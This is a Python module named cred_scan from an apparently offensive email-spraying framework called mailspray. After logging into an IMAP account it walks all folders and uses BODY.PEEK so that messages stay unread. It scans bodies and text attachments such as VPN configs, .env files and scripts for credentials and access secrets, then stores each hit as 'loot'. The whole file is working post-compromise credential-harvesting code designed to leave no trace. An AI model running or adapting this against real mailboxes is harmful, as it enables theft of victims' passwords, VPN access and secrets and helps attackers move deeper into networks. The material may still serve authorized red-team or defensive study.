"""cred_scan — hunt credentials, VPN configs and access secrets inside a mailbox.

Runs over IMAP (post-auth). Reads message bodies and text attachments across all
folders with BODY.PEEK (never sets the \\Seen flag), applies the secret patterns
from mailspray.core.patterns, and reports/stores every hit as loot.

Options (-O KEY=VAL):
  folders=INBOX,Sent   only these folders (default: all selectable)
  max=200              cap messages scanned per folder (default: unlimited)
  since=01-Jan-2024    IMAP SINCE date filter (DD-Mon-YYYY)
  attachments=off      skip text attachments (default: on)
"""

import base64
import email
import imaplib
import re
from email.header import decode_header, make_header
from html import unescape

from mailspray.core.module import BaseMSModule
from mailspray.core import patterns

# Attachment extensions worth scanning as text.
_TEXT_EXT = (
    ".txt", ".conf", ".cfg", ".ini", ".env", ".ovpn", ".ps1", ".sh", ".bat",
    ".cmd", ".xml", ".yaml", ".yml", ".json", ".csv", ".log", ".properties",
    ".rdp", ".config", ".md", ".sql", ".py", ".pl", ".php",
)

# LIST line: (flags) delim name — delim may be a quoted char or the atom NIL.
_LIST_RE = re.compile(rb'^\((?P<flags>[^)]*)\)\s+(?:"(?P<delim>[^"]*)"|NIL)\s+(?P<name>.+)$')
_FLAGS_RE = re.compile(rb'\((?P<flags>[^)]*)\)')
_TAG_RE = re.compile(r"(?s)<[^>]+>")
_SINCE_RE = re.compile(r"^\d{1,2}-[A-Za-z]{3}-\d{4}$")


def _decode_mutf7(s):
    """Decode an IMAP modified-UTF-7 folder name to Unicode for display/filtering."""
    if "&" not in s:
        return s
    res = []
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c != "&":
            res.append(c)
            i += 1
            continue
        j = s.find("-", i + 1)
        if j == -1:
            res.append(s[i:])
            break
        chunk = s[i + 1:j]
        if chunk == "":
            res.append("&")  # "&-" => literal "&"
        else:
            b64 = chunk.replace(",", "/")
            b64 += "=" * ((4 - len(b64) % 4) % 4)
            try:
                res.append(base64.b64decode(b64).decode("utf-16-be"))
            except Exception:
                res.append(s[i:j + 1])
        i = j + 1
    return "".join(res)


class CredScanModule(BaseMSModule):
    name = "cred_scan"
    description = "Search mailbox bodies + text attachments for credentials/VPN/access secrets"
    supported_protocols = ["imap"]
    opts_help = {
        "folders": "Comma-separated folders to scan (default: all selectable)",
        "max": "Max messages per folder, integer >= 1 (default: unlimited)",
        "since": "Only messages since DD-Mon-YYYY (IMAP SINCE)",
        "attachments": "on|off — scan text attachments (default: on)",
    }

    def options(self, opts):
        self.opts = dict(opts or {})
        self.only_folders = None
        if self.opts.get("folders"):
            self.only_folders = [f.strip() for f in self.opts["folders"].split(",") if f.strip()]

        raw_max = str(self.opts.get("max", "")).strip()
        self.max_msgs = int(raw_max) if raw_max.isdigit() and int(raw_max) > 0 else 0
        self._max_invalid = raw_max if (raw_max and not (raw_max.isdigit() and int(raw_max) > 0)) else None

        self.since = self.opts.get("since")
        self._since_invalid = None
        if self.since and not _SINCE_RE.match(self.since.strip()):
            self._since_invalid = self.since
            self.since = None
        elif self.since:
            self.since = self.since.strip()

        self.scan_attachments = str(self.opts.get("attachments", "on")).lower() != "off"

    # ── IMAP helpers ────────────────────────────────────────────────

    def _list_folders(self, conn):
        """Return [(raw_name, display_name)] for selectable folders.

        raw_name is the exact server token (sent to SELECT); display_name is the
        modified-UTF-7-decoded form used for reporting and the folders= filter.
        Handles quoted names, NIL delimiters, and literal (tuple) responses.
        """
        typ, data = conn.list()
        if typ != "OK" or not data:
            return []
        out = []
        for raw in data:
            if raw is None:
                continue
            if isinstance(raw, tuple):
                header = raw[0] or b""
                name_bytes = raw[1] or b""
                fm = _FLAGS_RE.search(header)
                flags = fm.group("flags").decode("ascii", "ignore") if fm else ""
                if "\\Noselect" in flags:
                    continue
                raw_name = name_bytes.decode("utf-8", "replace")
            else:
                if not isinstance(raw, (bytes, bytearray)):
                    continue
                m = _LIST_RE.match(bytes(raw).strip())
                if not m:
                    continue
                flags = m.group("flags").decode("ascii", "ignore")
                if "\\Noselect" in flags:
                    continue
                name = m.group("name").strip()
                if name.startswith(b'"') and name.endswith(b'"'):
                    name = name[1:-1]
                raw_name = name.decode("utf-8", "replace")
            out.append((raw_name, _decode_mutf7(raw_name)))
        return out

    def _search_uids(self, conn):
        try:
            if self.since:
                typ, data = conn.uid("SEARCH", None, "SINCE", self.since)
            else:
                typ, data = conn.uid("SEARCH", None, "ALL")
        except imaplib.IMAP4.error as e:
            raise RuntimeError(f"SEARCH rejected: {e}")
        if typ != "OK" or not data or not data[0]:
            return []
        uids = data[0].split()
        if self.max_msgs and len(uids) > self.max_msgs:
            uids = uids[-self.max_msgs:]  # most recent N
        return uids

    @staticmethod
    def _fetch_raw(conn, uid):
        # BODY.PEEK[] fetches the full RFC822 message WITHOUT setting \Seen.
        typ, data = conn.uid("FETCH", uid, "(BODY.PEEK[])")
        if typ != "OK" or not data:
            return None
        for part in data:
            if isinstance(part, tuple) and len(part) >= 2 and part[1]:
                return part[1]
        return None

    @staticmethod
    def _decode_subject(msg):
        raw = msg.get("Subject", "")
        if not raw:
            return "(no subject)"
        try:
            return str(make_header(decode_header(raw)))
        except Exception:
            return raw

    # ── extraction ──────────────────────────────────────────────────

    def _part_texts(self, part):
        """Return a list of text blobs to scan for a body/attachment part."""
        ctype = part.get_content_type()
        filename = part.get_filename()
        is_text_body = ctype in ("text/plain", "text/html")
        is_text_attach = bool(filename) and filename.lower().endswith(_TEXT_EXT)

        if not is_text_body and not is_text_attach:
            return []
        if is_text_attach and not self.scan_attachments:
            return []

        try:
            payload = part.get_payload(decode=True)
        except Exception:
            payload = None
        if payload is None:
            return []
        charset = part.get_content_charset() or "utf-8"
        try:
            text = payload.decode(charset, "replace")
        except LookupError:
            text = payload.decode("utf-8", "replace")

        if ctype == "text/html":
            raw = unescape(text)
            stripped = unescape(_TAG_RE.sub(" ", text))
            # raw catches secrets inside tag attributes (href/token=); stripped catches visible text
            return [raw, stripped]
        return [text]

    def _scan_message(self, ctx, folder, uid, raw):
        try:
            msg = email.message_from_bytes(raw)
        except Exception:
            return 0
        subject = self._decode_subject(msg)
        uid_s = uid.decode() if isinstance(uid, (bytes, bytearray)) else str(uid)
        source = f"{folder} | {subject} | uid {uid_s}"

        hits = 0
        seen = set()  # dedupe within a message (html raw + stripped overlap)
        for part in msg.walk():
            if part.is_multipart():
                continue
            for text in self._part_texts(part):
                for category, snippet in patterns.scan_text(text):
                    if (category, snippet) in seen:
                        continue
                    seen.add((category, snippet))
                    ctx.emit_loot(category, snippet, source=source)
                    hits += 1
        return hits

    # ── entry point ─────────────────────────────────────────────────

    def on_auth(self, ctx, handle):
        conn = handle
        if self._since_invalid:
            ctx.log_warn(f"cred_scan: ignoring invalid since={self._since_invalid!r} "
                         f"(expected DD-Mon-YYYY, e.g. 01-Jan-2025)")
        if self._max_invalid:
            ctx.log_warn(f"cred_scan: ignoring invalid max={self._max_invalid!r} "
                         f"(expected integer >= 1); scanning without a cap")

        all_folders = self._list_folders(conn)  # [(raw, display)]
        if self.only_folders is not None:
            wanted = {f.lower() for f in self.only_folders}
            matched = [(r, d) for (r, d) in all_folders
                       if d.lower() in wanted or r.lower() in wanted]
            # fall back to user-supplied names as raw tokens if nothing matched
            folders = matched or [(f, f) for f in self.only_folders]
        else:
            folders = all_folders

        if not folders:
            ctx.log_warn("cred_scan: no folders to scan")
            return

        ctx.log_info(f"cred_scan: scanning {len(folders)} folder(s) as {ctx.username}")
        total_msgs = 0
        for raw_name, display in folders:
            try:
                typ, _ = conn.select(f'"{raw_name}"', readonly=True)
                if typ != "OK":
                    ctx.log_warn(f"cred_scan: cannot select {display!r}")
                    continue
                uids = self._search_uids(conn)
            except Exception as e:
                ctx.log_warn(f"cred_scan: {display!r} failed: {e}")
                continue

            for uid in uids:
                total_msgs += 1
                try:
                    raw = self._fetch_raw(conn, uid)
                    if raw:
                        self._scan_message(ctx, display, uid, raw)
                except Exception:
                    continue

        ctx.log_info(
            f"cred_scan: done — {total_msgs} message(s) scanned, {ctx.loot_count} finding(s)"
        )
